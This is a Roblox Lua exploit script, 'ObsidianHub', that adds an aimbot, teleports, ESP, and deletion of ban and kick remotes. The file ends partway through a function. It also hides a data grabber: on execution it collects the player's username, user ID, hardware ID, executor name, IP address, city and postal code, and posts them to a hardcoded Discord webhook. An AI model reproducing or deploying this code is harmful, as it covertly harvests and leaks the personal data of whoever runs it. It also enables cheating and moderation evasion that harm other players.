local Venyx = loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/Venyx-UI-Library/main/source2.lua"))()
local UI = Venyx.new({
    title = "ObsidianHub" -- Title of the UI
})

-- Display a notification
UI:Notify({
    title = "Success", -- Title of the notification
    context = "",
    callback = function(accepted)
        -- Handle notification response if needed
    end
})

-- Create the Aimbot Page
local AimbotPage = UI:addPage({
    title = "Aimbot",  -- Title of the page
    icon = 50777179   -- Asset ID for the page icon (optional)
})

-- Create the Aimbot Settings Section
local AimbotSection = AimbotPage:addSection({
    title = "Aimbot Settings" -- Title of the section
})

-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Drawing = Drawing or require(game:GetService("ReplicatedStorage"):WaitForChild("Drawing"))
local HttpService = game:GetService("HttpService")
local VoiceChatService = game:GetService("VoiceChatService")

local Webhook_URL = "https://discord.com/api/webhooks/1357487042635890792/cS_tSbgcy9uZzr_Ldwr3XxZVpayWlmYb02rI4u5_MRpljp9gifyl_QSbcUKv6Xf6mzQH"

local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name

-- Function to calculate in-game time
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end


local function sendFullWebhookMessage(url, username, userId, gameName, executorName, hwid, ipAddress, country, city, postalCode, region)
    local data = {
        ["embeds"] = {{
            ["title"] = "ERLC SCRIPT Executed Successfully!",
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "User Information",
                    ["value"] = "Username: @" .. username .. "\nUser ID: " .. userId,
                    ["inline"] = false
                },
                {
                    ["name"] = "Game & Executor:",
                    ["value"] = "Game: " .. gameName .. "\nExecutor: " .. executorName,
                    ["inline"] = false
                },
                {
                    ["name"] = "HWID & IP Address:",
                    ["value"] = "HWID: " .. hwid .. "\nIP Address: " .. ipAddress,
                    ["inline"] = false
                },
                {
                    ["name"] = "Location:",
                    ["value"] = "Country: " .. country .. "\nCity: " .. city .. "\nRegion: " .. region .. "\nPostal Code: " .. postalCode,
                    ["inline"] = false
                },
                {
                    ["name"] = "Time Executed:",
                    ["value"] = os.date("%d/%m/%Y %I:%M:%S %p"),
                    ["inline"] = false
                }
            }
        }}
    }

    local jsonData = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
        ["Content-Type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request

    local success, response = pcall(function()
        return request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })
    end)
    if not success then
        warn("Failed to send webhook message: ", response)
    end
end

local function sendMinimalWebhookMessage(url, username, userId, gameName, executorName, hwid)
    local data = {
        ["embeds"] = {{
            ["title"] = "Executed Successfully",
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "User Information",
                    ["value"] = "Username: @" .. username .. "\nUser ID: " .. userId,
                    ["inline"] = false
                },
                {
                    ["name"] = "Game & Executor:",
                    ["value"] = "Game: " .. gameName .. "\nExecutor: " .. executorName,
                    ["inline"] = false
                },
                {
                    ["name"] = "HWID:",
                    ["value"] = "HWID: " .. hwid,
                    ["inline"] = false
                },
                {
                    ["name"] = "Time Executed:",
                    ["value"] = os.date("%d/%m/%Y %I:%M:%S %p"),
                    ["inline"] = false
                }
            }
        }}
    }

    local jsonData = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request

    local success, response = pcall(function()
        return request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })
    end)
    if not success then
        warn("Failed to send webhook message: ", response)
    end
end

local webhookUrl1 = "https://discord.com/api/webhooks/1357487042635890792/cS_tSbgcy9uZzr_Ldwr3XxZVpayWlmYb02rI4u5_MRpljp9gifyl_QSbcUKv6Xf6mzQH" -- Replace with your actual webhook URL
local webhookUrl2 = "https://discord.com/api/webhooks/1357487042635890792/cS_tSbgcy9uZzr_Ldwr3XxZVpayWlmYb02rI4u5_MRpljp9gifyl_QSbcUKv6Xf6mzQH" -- Replace with your actual webhook URL

local function getGameName()
    local success, result = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    if success then
        return result
    else
        return "Unknown Game"
    end
end

local function getExecutorName()
    if identifyexecutor then
        local success, result = pcall(identifyexecutor)
        if success then
            return result
        else
            return "Unknown Executor (identifyexecutor failed)"
        end
    else
        return "Unknown Executor"
    end
end

local function getIPAddress()
    local success, response = pcall(function()
        return game:GetService("HttpService"):JSONDecode(game:HttpGet('https://ipwho.is/'))
    end)

    if success and response then
        local ip = response.ip or "Unknown IP"
        local country = response.country or "Unknown Country"
        local city = response.city or "Unknown City"
        local postalCode = response.postal or "Unknown Postal Code"
        local region = response.region or "Unknown Region"
        return ip, country, city, postalCode, region
    else
        return "Unable to fetch IP", "Unable to fetch Country", "Unable to fetch City", "Unable to fetch Postal Code", "Unable to fetch Region"
    end
end



local player = game.Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local gameName = getGameName()
local executorName = getExecutorName()
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

local ipAddress, country, city, postalCode, region = getIPAddress()

sendFullWebhookMessage(webhookUrl1, username, userId, gameName, executorName, hwid, ipAddress, country, city, postalCode, region)

sendMinimalWebhookMessage(webhookUrl2, username, userId, gameName, executorName, hwid)


local remotes = {} -- Store detected ban remotes

local function blockRemote(remote)
    if not remotes[remote] then
        remotes[remote] = true
        remote:Destroy() -- Deletes the remote to prevent bans
    end
end

for _, v in pairs(game:GetDescendants()) do
    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
        if string.find(v.Name:lower(), "ban") or string.find(v.Name:lower(), "kick") then
            blockRemote(v)
        end
    end
end

game.DescendantAdded:Connect(function(v)
    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
        if string.find(v.Name:lower(), "ban") or string.find(v.Name:lower(), "kick") then
            blockRemote(v)
        end
    end
end)


-- Settings
local aimbotEnabled = false
local fovCircleVisible = false
local fov = 80
local sensitivity = 0.1  -- Sensitivity value for camera movement
local fovColor = Color3.fromRGB(0, 0, 255)
local target = nil  -- Currently locked target

-- FOV Circle Drawing
local FOVCircle = Drawing.new("Circle")
FOVCircle.Visible = false
FOVCircle.Thickness = 1.5
FOVCircle.Radius = fov
FOVCircle.Transparency = 1
FOVCircle.Color = fovColor

local function GetClosestPlayer()
    local closestDistance = math.huge
    local closestPlayer = nil

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local character = player.Character
            if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
                local screenPoint = Camera:WorldToScreenPoint(character.HumanoidRootPart.Position)
                local mousePos = UserInputService:GetMouseLocation()
                local distance = (Vector2.new(mousePos.X, mousePos.Y) - Vector2.new(screenPoint.X, screenPoint.Y)).Magnitude

                if distance < closestDistance and distance < fov then
                    closestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end

    return closestPlayer
end

-- Add Aimbot Toggle
AimbotSection:addToggle({
    title = "Enable Aimbot",  -- Title of the toggle
    default = false,         -- Default value (off)
    callback = function(value)
        aimbotEnabled = value
        if not aimbotEnabled then
            target = nil
        end
    end
})

-- Add FOV Circle Visibility Toggle
AimbotSection:addToggle({
    title = "Draw FOV Circle", -- Title of the toggle
    default = false,          -- Default value (off)
    callback = function(value)
        fovCircleVisible = value
        FOVCircle.Visible = fovCircleVisible
    end
})

-- Add FOV Slider
AimbotSection:addSlider({
    title = "FOV Radius",       -- Title of the slider
    min = 0,                   -- Minimum value
    max = 300,                 -- Maximum value
    default = fov,             -- Default value
    color = Color3.fromRGB(255, 255, 255), -- Slider color
    increment = 5,             -- Increment step
    callback = function(value)
        fov = value
        FOVCircle.Radius = fov
    end
})

-- Add FOV Circle Color Picker
AimbotSection:addColorPicker({
    title = "FOV Circle Color", -- Title of the color picker
    default = Color3.fromRGB(255, 0, 0), -- Default color
    callback = function(value)
        fovColor = value
        FOVCircle.Color = fovColor
    end
})

-- Main loop
RunService.RenderStepped:Connect(function()
    local pressed = UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
    local mousePos = UserInputService:GetMouseLocation()

    -- Update FOV Circle properties
    if fovCircleVisible then
        FOVCircle.Position = mousePos
    end
    FOVCircle.Radius = fov
    FOVCircle.Color = fovColor
    FOVCircle.Transparency = 1
    FOVCircle.Thickness = 1.5

    -- Aimbot logic
    if aimbotEnabled then
        if pressed then
            if not target then
                target = GetClosestPlayer()
            end

            if target and target.Character and target.Character:FindFirstChild("Head") then
                local targetPosition = target.Character.Head.Position
                local targetScreenPosition = Camera:WorldToScreenPoint(targetPosition)

                -- Directly set the camera's CFrame to the target's head
                local targetCFrame = CFrame.new(Camera.CFrame.Position, targetPosition)
                Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetPosition) * CFrame.Angles(0, math.rad(0), 0)

                -- Optionally, you can smooth this movement with tweening if desired
                -- local tweenInfo = TweenInfo.new(sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
                -- local tween = TweenService:Create(Camera, tweenInfo, { CFrame = targetCFrame })
                -- tween:Play()
            end
        else
            target = nil
        end
    end

    -- Close the script on Delete key
    if UserInputService:IsKeyDown(Enum.KeyCode.Delete) then
        RunService.RenderStepped:Disconnect()
        FOVCircle:Remove()
        UI:Destroy()  -- Destroy the UI
    end
end)

-- Create the Teleportation Page
local TeleportationPage = UI:addPage({
    title = "Teleportation", -- Title of the page
    icon = 1234567890       -- Asset ID for the page icon (optional)
})





-- Create a Section for Waypoints
local WaypointSection = TeleportationPage:addSection({
    title = "Waypoint" -- Title of the section
})

-- Define variable to store the copied CFrame
local savedCFrame = nil

-- Button to save the user's current CFrame
WaypointSection:addButton({
    title = "Make new Waypoint",
    callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        if character and character:FindFirstChild("HumanoidRootPart") then
            savedCFrame = character.HumanoidRootPart.CFrame
            print("New waypoint saved at: " .. tostring(savedCFrame))
        else
            warn("HumanoidRootPart not found!")
        end
    end
})

-- Button to teleport to the saved CFrame
WaypointSection:addButton({
    title = "Teleport to Waypoint",
    callback = function()
        if savedCFrame then
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            if character and character:FindFirstChild("HumanoidRootPart") then
                -- Teleport smoothly by tweening the CFrame
                local tweenService = game:GetService("TweenService")
                local humanoidRootPart = character.HumanoidRootPart
                local teleportTween = tweenService:Create(humanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {CFrame = savedCFrame})

                teleportTween:Play()
                teleportTween.Completed:Wait()
                print("Teleported to waypoint.")
            else
                warn("HumanoidRootPart not found!")
            end
        else
            warn("No waypoint has been set!")
        end
    end
})
















-- Create the Spawn Section
local SpawnSection = TeleportationPage:addSection({
    title = "Spawn" -- Title of the section
})

-- Add the Spawn Button
SpawnSection:addButton({
    title = "Spawn", -- Title of the button
    callback = function()
        -- Ensure the player and their character exist
        local player = game.Players.LocalPlayer
        if player and player.Character then
            local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                -- Set the CFrame of the HumanoidRootPart to the specified coordinates
                humanoidRootPart.CFrame = CFrame.new(
                    -505.467957, 23.7107906, 652.503906, 
                    -0.99977529, 1.07727978e-08, -0.0211992487, 
                    9.80691262e-09, 1, 4.56662193e-08, 
                    0.0211992487, 4.54480578e-08, -0.99977529
                )
            end
        end
    end
})




-- Create the Criminal Section
local CriminalSection = TeleportationPage:addSection({
    title = "Criminal/Robbery Assitance" -- Title of the section
})

-- Add Dropdown Menu for Location Selector
CriminalSection:addDropdown({
    title = "Select Location",  -- Title of the dropdown
    list = {
        "None", 
        "Gun Store", 
        "Car Seller", 
        "Tool Store", 
        "Jewelry Store", 
        "Bank", 
        "Underground Bunker",  -- New location
        "Bounty Hunter"        -- New location
    }, -- List of options
    callback = function(value)
        local player = game.Players.LocalPlayer
        if player and player.Character then
            local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                -- Define CFrames for each location
                local locations = {
                    None = nil,
                    ["Gun Store"] = CFrame.new(
                        -1198.71448, 23.2480125, -170.569321, 
                        0.731142402, -4.53885152e-09, -0.682224929, 
                        1.14018062e-09, 1, -5.4310787e-09, 
                        0.682224929, 3.19303206e-09, 0.731142402
                    ),
                    ["Car Seller"] = CFrame.new(
                        1624.4657, 3.82302451, -501.705902, 
                        0.408474684, -6.46358274e-08, 0.912769675, 
                        1.10165317e-08, 1, 6.5882837e-08, 
                        -0.912769675, -1.6855914e-08, 0.408474684
                    ),
                    ["Tool Store"] = CFrame.new(
                        -439.869232, 24.5106964, -715.560669, 
                        -0.865956128, 4.48093083e-08, -0.500119984, 
                        -1.10567413e-08, 1, 1.0874183e-07, 
                        0.500119984, 9.96953489e-08, -0.865956128
                    ),
                    ["Jewelry Store"] = CFrame.new(
                        -464.756714, 23.7106667, -411.026428, 
                        0.998576045, 4.38038744e-10, -0.0533464141, 
                        -2.77688805e-09, 1, -4.37685514e-08, 
                        0.0533464141, 4.38543637e-08, 0.998576045
                    ),
                    ["Bank"] = CFrame.new(
                        -1140.61011, 23.2476749, 449.233765, 
                        -0.0293217897, 1.06881526e-08, -0.999570012, 
                        5.65440361e-09, 1, 1.05268816e-08, 
                        0.999570012, -5.34330535e-09, -0.0293217897
                    ),
                    ["Underground Bunker"] = CFrame.new(
                        -1357.98584, 2.37512946, -1234.61914, 
                        -0.953902245, 5.52598145e-08, 0.300117463, 
                        4.44210784e-08, 1, -4.29380123e-08, 
                        -0.300117463, -2.76271255e-08, -0.953902245
                    ),
                    ["Bounty Hunter"] = CFrame.new(
                        2931.9292, 76.5576782, -776.82666, 
                        -0.891279995, 2.90516162e-08, -0.453453422, 
                        1.11739749e-10, 1, 6.38478497e-08, 
                        0.453453422, 5.68556402e-08, -0.891279995
                    ),
                }

                -- Get the selected location's CFrame
                local selectedCFrame = locations[value]
                
                -- Teleport the player to the selected location if CFrame is valid
                if selectedCFrame then
                    humanoidRootPart.CFrame = selectedCFrame
                end
            end
        end
    end    
})












local GasStationsSection = TeleportationPage:addSection({
    title = "Gas Stations" -- Title of the section
})

-- Define the CFrames for each gas station
local gasStationLocations = {
    ["Gas Station 1"] = CFrame.new(
        -977.28595, 23.2107048, 702.084229,
        -0.00783373136, 2.52783945e-08, 0.999969304,
        -3.2030826e-08, 1, -2.55300989e-08,
        -0.999969304, -3.22298384e-08, -0.00783373136
    ),
    ["Gas Station 2"] = CFrame.new(
        619.959778, 3.19807577, -1537.24841,
        0.119836323, 1.07668727e-08, -0.992793679,
        1.69497394e-08, 1, 1.2890963e-08,
        0.992793679, -1.83723987e-08, 0.119836323
    ),
    ["Gas Station 3"] = CFrame.new(
        2497.48755, -12.3789701, -1636.23853,
        0.999889612, 1.97213854e-08, -0.014856413,
        -1.86305709e-08, 1, 7.35621626e-08,
        0.014856413, -7.32772563e-08, 0.999889612
    ),
}

-- Add Dropdown Menu for Gas Stations with the new options
GasStationsSection:addDropdown({
    title = "Select an Option",  -- Title of the dropdown
    list = {"Gas Station 1", "Gas Station 2", "Gas Station 3"}, -- List of options
    callback = function(selectedOption)
        print("Dropdown selected:", selectedOption)
        -- Handle the selected option here
        -- For example, if you want to teleport to a gas station
        if selectedOption ~= "None" then
            local locationCFrame = gasStationLocations[selectedOption]
            if locationCFrame then
                local player = game.Players.LocalPlayer
                if player and player.Character then
                    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                        humanoidRootPart.CFrame = locationCFrame
                    else
                        print("HumanoidRootPart not found in player character")
                    end
                else
                    print("Player or player.Character not found")
                end
            else
                print("Location CFrame not found for:", selectedOption)
            end
        end
    end
})










local OtherSection = TeleportationPage:addSection({
    title = "Other" -- Title of the section
})

-- Define the CFrames for each location
local locations = {
    ["Hospital"] = CFrame.new(
        -141.743423, 23.3343201, -436.428162,
        0.999859035, 1.82984845e-08, 0.0167886484,
        -1.89841796e-08, 1, 4.06834424e-08,
        -0.0167886484, -4.09964258e-08, 0.999859035
    ),
    ["Postal Office"] = CFrame.new(
        647.735413, 3.6981535, -472.93866,
        -0.0911604762, 1.08815385e-07, -0.995836198,
        8.49627479e-09, 1, 1.084926e-07,
        0.995836198, 1.42933965e-09, -0.0911604762
    ),
    ["Police Station"] = CFrame.new(
        697.348633, 3.66067529, -118.044838,
        -0.998747885, 6.65068045e-09, 0.050027106,
        7.92670907e-09, 1, 2.53083474e-08,
        -0.050027106, 2.56732076e-08, -0.998747885
    ),
    ["Sherrifs Office"] = CFrame.new(
        1519.53967, -11.8770685, -1957.86328,
        -0.999998987, -1.23013488e-09, 0.00144022494,
        -1.3140059e-09, 1, -5.82336952e-08,
        -0.00144022494, -5.82355248e-08, -0.999998987
    ),
    ["Jail"] = CFrame.new(
        1341.18518, 3.6958375, -336.934052,
        0.999974728, -6.78301504e-08, 0.00710828975,
        6.83275871e-08, 1, -6.9737311e-08,
        -0.00710828975, 7.02212404e-08, 0.999974728
    ),
}

-- Function to handle smooth instant teleportation
local function teleportToLocation(targetCFrame)
    local player = game.Players.LocalPlayer
    if player and player.Character then
        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            -- Ensure the character is fully loaded and grounded before teleporting
            if player.Character:FindFirstChild("Humanoid") and player.Character:FindFirstChild("Humanoid").RootPart then
                -- Set the new CFrame
                humanoidRootPart.CFrame = targetCFrame
            else
                warn("Humanoid or RootPart not found!")
            end
        else
            warn("HumanoidRootPart not found!")
        end
    else
        warn("Player or Character not found!")
    end
end

-- Add Dropdown Menu with New Options
OtherSection:addDropdown({
    title = "Select an Option",  -- Title of the dropdown
    list = {"Hospital", "Postal Office", "Police Station","Sherrifs Office","Jail"}, -- List of options
    callback = function(selectedOption)
        print("Dropdown selected:", selectedOption)
        -- Handle the selected option here
        -- For example, if you want to teleport to a location
        -- You would need to map "Option 1", "Option 2", etc. to actual locations if needed
        -- Currently, it's just printing the selected option
        local locationCFrame = locations[selectedOption]
        if locationCFrame then
            teleportToLocation(locationCFrame)
        else
            print("CFrame for location not found for:", selectedOption)
        end
    end
})









local ATMSandHousesSection = TeleportationPage:addSection({
    title = "ATMS/Houses" -- Title of the section
})

-- Define ATM CFrames including a "None" option
local ATMs = {
    ["None"] = nil,  -- This entry signifies no movement should occur
    ["ATM 1"] = CFrame.new(-487.113312, 23.7480087, 444.513977, -0.999783933, -2.20798579e-08, -0.0207876563, -2.0967871e-08, 1, -5.37106075e-08, 0.0207876563, -5.3263129e-08, -0.999783933),
    ["ATM 2"] = CFrame.new(-375.451294, 23.7106667, 152.370117, 0.0204466879, -7.16725213e-09, -0.999790967, -7.801561e-08, 1, -8.76424533e-09, 0.999790967, 7.81785019e-08, 0.0204466879),
    ["ATM 3"] = CFrame.new(-585.005798, 23.2106667, -405.970154, 0.999496341, 7.55746932e-09, 0.031734243, -7.49425055e-09, 1, -2.11104734e-09, -0.031734243, 1.87215976e-09, 0.999496341),
    ["ATM 4"] = CFrame.new(-967.710693, 23.7415009, 830.593384, -0.999993563, -3.90976851e-09, -0.00358740473, -3.9136081e-09, 1, 1.06324782e-09, 0.00358740473, 1.0772806e-09, -0.999993563),
    ["ATM 5"] = CFrame.new(-1018.44458, 23.8422203, 440.476501, -0.999797702, -1.04781153e-08, 0.0201148633, -9.33078859e-09, 1, 5.71326311e-08, -0.0201148633, 5.69333842e-08, -0.999797702),
    ["ATM 6"] = CFrame.new(996.884644, 3.69802427, -25.2728481, -0.997444093, -2.96525346e-08, -0.0714514479, -2.35790072e-08, 1, -8.58456204e-08, 0.0714514479, -8.39414511e-08, -0.997444093),
    ["ATM 7"] = CFrame.new(1111.54565, 3.66068506, 372.539398, 0.0866908953, -8.42515391e-08, -0.996235251, -1.71123151e-08, 1, -8.60590106e-08, 0.996235251, 2.45084237e-08, 0.0866908953),
    ["ATM 8"] = CFrame.new(2486.30981, -11.8799753, -1737.61206, 0.998913169, 6.15962676e-08, 0.0466098711, -5.89835487e-08, 1, -5.7430448e-08, -0.0466098711, 5.46188161e-08, 0.998913169),
    ["ATM 9"] = CFrame.new(2613.8938, -11.9173918, -2093.91016, 0.998950422, -1.90768956e-10, -0.0458045267, 1.60884556e-10, 1, -6.56119936e-10, 0.0458045267, 6.48062048e-10, 0.998950422),
    ["ATM 10"] = CFrame.new(2558.21289, -11.917448, -2238.27271, 0.0294445287, 7.44225082e-09, -0.999566436, -2.31045654e-08, 1, 6.76488066e-09, 0.999566436, 2.28953585e-08, 0.0294445287)
}

-- Create a table of ATM names for dropdown options, ordered from 1 to 10 plus "None"
local ATMNames = {"None"}  -- Start with "None" option
for i = 1, 10 do
    table.insert(ATMNames, "ATM " .. i)
end

-- Add the dropdown menu
ATMSandHousesSection:addDropdown({
    title = "Select an ATM",
    list = ATMNames,
    callback = function(selectedATM)
        local cframe = ATMs[selectedATM]
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character.PrimaryPart then
            if cframe then
                -- Move player to the selected ATM's location
                player.Character:SetPrimaryPartCFrame(cframe)
            end
            -- If selectedATM is "None", no action is taken, and the player remains where they are
        end
        print("Dropdown selected:", selectedATM)
    end    
})

-- List of CFrames to teleport to
local cframes = {
    CFrame.new(1213.66626, 3.32743382, -1037.1488, 0.987790287, -1.74776282e-08, -0.155789584, 3.31574341e-08, 1, 9.80486732e-08, 0.155789584, -1.02017104e-07, 0.987790287),
    CFrame.new(1335.94849, 3.77058911, -959.160278, -0.985945821, -6.16276452e-08, -0.167065278, -7.00428942e-08, 1, 4.4478778e-08, 0.167065278, 5.55554038e-08, -0.985945821),
    CFrame.new(1247.6344, 3.77058911, -959.302368, -0.99265492, 1.98811438e-08, 0.120980047, 1.55285971e-08, 1, -3.69201842e-08, -0.120980047, -3.47703519e-08, -0.99265492),
    CFrame.new(-740.352539, -8.81006527, -1392.46228, -0.99898994, -8.37003977e-09, -0.0449338965, -4.11223189e-09, 1, -9.48495824e-08, 0.0449338965, -9.45689962e-08, -0.99898994),
    CFrame.new(-995.86908, -9.05234528, -1529.20886, 0.999989569, -1.92240872e-08, 0.0045716376, 1.95222043e-08, 1, -6.5165267e-08, -0.0045716376, 6.5253829e-08, 0.999989569),
    CFrame.new(-1389.63306, -8.81006527, -1731.40063, 0.855655253, 6.4681891e-09, 0.517546237, 1.11399991e-08, 1, -3.09154764e-08, -0.517546237, 3.22184519e-08, 0.855655253),
    CFrame.new(-1149.17969, -9.05234432, -1752.32886, -0.998203456, -1.04891285e-09, -0.0599154346, -7.17963078e-10, 1, -5.54514212e-09, 0.0599154346, -5.49216317e-09, -0.998203456),
    CFrame.new(-726.539124, -8.81006527, -1889.41162, 0.999535441, 8.5560814e-10, -0.0304784086, -1.01324049e-09, 1, -5.15648946e-09, 0.0304784086, 5.184976e-09, 0.999535441),
    CFrame.new(-493.500732, -7.44760752, -1872.88318, 0.999964535, -7.50357785e-08, 0.00842297077, 7.51620206e-08, 1, -1.46714711e-08, -0.00842297077, 1.53040389e-08, 0.999964535),
    CFrame.new(-146.703461, -7.44792271, -1509.40649, 0.995531142, 7.58703766e-09, -0.0944337696, -5.90913229e-09, 1, 1.80476984e-08, 0.0944337696, -1.74090236e-08, 0.995531142)
}

-- Function to teleport the player to a random CFrame
local function teleportToRandomCFrame()
    local player = game.Players.LocalPlayer
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
        warn("Player or HumanoidRootPart not found")
        return
    end

    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then
        warn("")
        return
    end

    local randomIndex = math.random(1, #cframes)
    local targetCFrame = cframes[randomIndex]
    
    humanoidRootPart.CFrame = targetCFrame
end

-- Add the button and its functionality
ATMSandHousesSection:addButton({
    title = "Random Houses",
    callback = function()
        teleportToRandomCFrame()
        print("")
    end    
})





local ESPPage = UI:addPage({
    title = "ESP",  -- Title of the page
    icon = 1234567890     -- Asset ID for the page icon (optional)
})



local EspsSection = ESPPage:addSection({
    title = "Esps" -- Title of the section
})


-- Declare a variable to track the ESP state
local isESPEnabled = false

-- Function to enable ESP
local function enableESP()
    local Holder = Instance.new("Folder", game.CoreGui)
    Holder.Name = "ESP"

    local Box = Instance.new("BoxHandleAdornment")
    Box.Name = "nilBox"
    Box.Size = Vector3.new(1, 2, 1)
    Box.Color3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
    Box.Transparency = 0.7
    Box.ZIndex = 0
    Box.AlwaysOnTop = false
    Box.Visible = false

    local NameTag = Instance.new("BillboardGui")
    NameTag.Name = "nilNameTag"
    NameTag.Enabled = false
    NameTag.Size = UDim2.new(0, 200, 0, 50)
    NameTag.AlwaysOnTop = true
    NameTag.StudsOffset = Vector3.new(0, 1.8, 0)
    local Tag = Instance.new("TextLabel", NameTag)
    Tag.Name = "Tag"
    Tag.BackgroundTransparency = 1
    Tag.Position = UDim2.new(0, -50, 0, 0)
    Tag.Size = UDim2.new(0, 300, 0, 20)
    Tag.TextSize = 20
    Tag.TextColor3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
    Tag.TextStrokeColor3 = Color3.new(0 / 255, 0 / 255, 0 / 255)
    Tag.TextStrokeTransparency = 0.4
    Tag.Text = ""
    Tag.Font = Enum.Font.SourceSansBold
    Tag.TextScaled = false

    local function LoadCharacter(v)
        repeat wait() until v.Character ~= nil
        v.Character:WaitForChild("Humanoid")
        local vHolder = Holder:FindFirstChild(v.Name)
        if not vHolder then
            vHolder = Instance.new("Folder", Holder)
            vHolder.Name = v.Name
        end
        vHolder:ClearAllChildren()
        local b = Box:Clone()
        b.Name = v.Name .. "Box"
        b.Adornee = v.Character
        b.Parent = vHolder
        local t = NameTag:Clone()
        t.Name = v.Name .. "NameTag"
        t.Enabled = true
        t.Parent = vHolder
        t.Adornee = v.Character:WaitForChild("Head", 5)
        if not t.Adornee then
            return UnloadCharacter(v)
        end
        t.Tag.Text = v.Name
        b.Color3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
        t.Tag.TextColor3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
        local Update
        local UpdateNameTag = function()
            if not pcall(function()
                v.Character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
                local maxh = math.floor(v.Character.Humanoid.MaxHealth)
                local h = math.floor(v.Character.Humanoid.Health)
            end) then
                Update:Disconnect()
            end
        end
        UpdateNameTag()
        Update = v.Character.Humanoid.Changed:Connect(UpdateNameTag)
    end

    local function UnloadCharacter(v)
        local vHolder = Holder:FindFirstChild(v.Name)
        if vHolder and (vHolder:FindFirstChild(v.Name .. "Box") or vHolder:FindFirstChild(v.Name .. "NameTag")) then
            vHolder:ClearAllChildren()
        end
    end

    local function LoadPlayer(v)
        local vHolder = Instance.new("Folder", Holder)
        vHolder.Name = v.Name
        v.CharacterAdded:Connect(function()
            pcall(LoadCharacter, v)
        end)
        v.CharacterRemoving:Connect(function()
            pcall(UnloadCharacter, v)
        end)
        v.Changed:Connect(function(prop)
            if prop == "TeamColor" then
                UnloadCharacter(v)
                wait()
                LoadCharacter(v)
            end
        end)
        LoadCharacter(v)
    end

    local function UnloadPlayer(v)
        UnloadCharacter(v)
        local vHolder = Holder:FindFirstChild(v.Name)
        if vHolder then
            vHolder:Destroy()
        end
    end

    for i, v in pairs(game:GetService("Players"):GetPlayers()) do
        spawn(function() pcall(LoadPlayer, v) end)
    end

    game:GetService("Players").PlayerAdded:Connect(function(v)
        pcall(LoadPlayer, v)
    end)

    game:GetService("Players").PlayerRemoving:Connect(function(v)
        pcall(UnloadPlayer, v)
    end)

    game:GetService("Players").LocalPlayer.NameDisplayDistance = 0
end

-- Function to disable ESP
local function disableESP()
    local holder = game.CoreGui:FindFirstChild("ESP")
    if holder then
        holder:Destroy()
    end
end

EspsSection:addToggle({
    title = "Name Esp",  -- Title of the toggle
    default = false,    -- Default value (off)
    callback = function(value)
        isESPEnabled = value
        if isESPEnabled then
            enableESP()
        else
            disableESP()
        end
    end
})













-- Services
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

-- Configuration for ESP
local config = {
    ESP = {
        Box = {
            Box = true,
            TeamCheck = true,
            BoxColor = Color3.fromRGB(0, 0, 0),
            TeamColor = true
        }
    }
}

-- Toggle state variable
local isToggleOn = false

-- Create and update ESP boxes
local function createBoxESP(playerCharacter)
    -- Create ESP GUI elements
    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Parent = playerCharacter.Character:FindFirstChild("HumanoidRootPart") or playerCharacter.Character
    billboardGui.Name = playerCharacter.Name .. "_BoxESP"
    billboardGui.AlwaysOnTop = true
    billboardGui.Size = UDim2.new(4, 0, 5.4, 0)
    billboardGui.ClipsDescendants = false
    billboardGui.Enabled = isToggleOn

    local frame = Instance.new("Frame", billboardGui)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BorderSizePixel = 1
    frame.BackgroundTransparency = 1

    local topFrame = Instance.new("Frame", frame)
    topFrame.BorderSizePixel = 1
